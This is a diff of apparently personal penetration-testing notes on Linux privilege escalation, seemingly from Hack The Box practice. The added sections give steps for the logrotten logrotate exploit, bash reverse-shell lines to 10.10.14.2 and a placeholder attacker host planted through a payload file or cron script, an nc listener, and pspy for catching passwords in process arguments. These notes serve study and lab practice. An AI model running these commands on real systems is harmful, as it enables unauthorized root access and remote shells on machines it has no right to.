@@ -38,6 +38,41 @@ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/nul
 find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
 ```
 
+# Logrotate
+https://github.com/whotwagner/logrotten
+1. we need `write` permissions on the log files
+2. logrotate must run as a privileged user or `root`
+3. vulnerable versions:
+    - 3.8.6
+    - 3.11.0
+    - 3.15.0
+    - 3.18.0
+```bash
+git clone https://github.com/whotwagner/logrotten.git && cd logrotten
+gcc logrotten.c -o logrotten
+
+echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+create
+
+./logrotten -p ./payload /tmp/tmp.log
+# waiting for running logrotate
+```
+
+# Cron
+1. `cat /etc/crontab`
+2. Modify available cron script and add your code there: 
+```bash
+bash -i >& /dev/tcp/attacker.ip/6666 0>&1   
+```
+3. Listen on attacker machine: `nc -nlvp 6666`
+## psspy
+Spy on running process to find passed function arguments like passwords
+https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+```bash
+./pspy64 -pf -i 1000
+```
+# Misc
 ##### Groups
 adm
 Members of the adm group are able to read all logs stored in /var/log. 
@@ -69,9 +104,6 @@ ssh htb-user@10.129.205.109 -t "bash --noprofile"
 - **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
 - **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
 - **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
-## psspy
-Spy on running process to find passed function arguments like passwords
-https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
 #### Kernel exploits
 * https://github.com/The-Z-Labs/linux-exploit-suggester
 * https://www.cvedetails.com/
@@ -104,14 +136,6 @@ https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_pre
 #### Capabilities
 1. `getcap -r / 2>/dev/null`
 2. Check gtfobins
-#### Cron
-1. `cat /etc/crontab`
-2. Modify available cron script and add your code there: 
-```bash
-bash -i >& /dev/tcp/attacker.ip/6666 0>&1   
-```
-3. Listen on attacker machine: `nc -nlvp 6666`
-
 #### [[NFS]]
 List mountable devices `cat /etc/exports`
 
